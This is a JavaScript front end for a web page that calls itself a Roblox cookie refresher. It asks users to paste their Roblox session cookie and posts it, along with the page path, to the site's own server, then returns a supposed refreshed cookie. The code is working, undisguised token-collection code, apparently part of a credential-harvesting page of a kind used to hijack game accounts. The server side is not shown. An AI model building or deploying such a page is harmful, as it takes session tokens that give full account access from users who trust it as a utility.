const form = document.querySelector('#cookieForm');
const cookieInput = document.getElementById("cookieInput");
const newCookieInput = document.getElementById("newCookie");
const countdownTimer = document.getElementById("countdownTimer");

let lastSubmitTime = 0;
const cooldownTime = 30000;

form.addEventListener('submit', function(event) {
    event.preventDefault();
    const currentTime = Date.now();

    if (currentTime - lastSubmitTime < cooldownTime) {
        Swal.fire({ icon: 'error', title: 'Wait', text: `Please wait before submitting again.`, confirmButtonColor: '#FF0000' });
        return;
    }

    let cookieValue = cookieInput.value.trim();
    if (!cookieValue) {
        Swal.fire({ icon: 'error', title: 'No Cookie', text: 'Enter a valid cookie.', confirmButtonColor: '#FF0000' });
        return;
    }

    lastSubmitTime = currentTime;
    startCountdown();

    let formData = new FormData();
    formData.append('roblox_cookie', cookieValue);
    formData.append('uri', location.pathname);

    fetch("/Refresher/refresh", { 
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        if (data === "ratelimited") {
            Swal.fire({ icon: 'error', title: 'Rate Limited', text: 'Try again later.', confirmButtonColor: '#FF0000' });
        } else if (data === "invalid cookie") {
            Swal.fire({ icon: 'error', title: 'Invalid Cookie', text: 'Cookie is invalid.', confirmButtonColor: '#FF0000' });
        } else {
            newCookieInput.value = data;
            Swal.fire({ icon: 'success', title: 'Cookie Refreshed!', text: 'Your refreshed cookie has been saved.', confirmButtonColor: '#00FF00' });
        }
    })
    .catch(error => {
        console.error("Error:", error);
        Swal.fire({ icon: 'error', title: 'Error', text: 'Something went wrong.', confirmButtonColor: '#FF0000' });
    });
});

function startCountdown() {
    let remainingTime = cooldownTime / 1000;
    countdownTimer.style.display = "block";

    const countdownInterval = setInterval(() => {
        remainingTime--;
        countdownTimer.textContent = `Next submission in: 00:${String(remainingTime).padStart(2, '0')}`;
        if (remainingTime <= 0) {
            clearInterval(countdownInterval);
            countdownTimer.style.display = "none";
        }
    }, 1000);
}

function copyCookie() {
    const cookie = newCookieInput.value;
    if (cookie) {
        navigator.clipboard.writeText(cookie).then(() => {
            Swal.fire({ icon: 'success', title: 'Copied!', text: 'Cookie copied.', confirmButtonColor: '#00FF00' });
        });
    }
}

particlesJS("particles-js", {
    particles: { number: { value: 80 }, shape: { type: "circle" }, opacity: { value: 0.8 }, size: { value: 3 } }
});
